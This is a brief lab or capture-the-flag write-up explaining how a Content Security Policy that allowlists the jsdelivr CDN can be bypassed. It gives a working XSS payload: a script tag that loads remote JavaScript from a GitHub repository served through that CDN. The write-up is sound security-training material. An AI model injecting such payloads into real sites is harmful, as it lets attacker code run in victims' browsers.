# Context

The lab uses CSP to mitigate XSS. But the lab allowlists the following domain: `cdn.jsdeliver.net*`. This means we can inject JS onto the web page by the following XSS payload:

```html
<script src="https://cdn.jsdelivr.net/gh/kevin-fagan/csp-bypass-payloads@main/csp-bypass-lab-nevernote.js"></script>
```
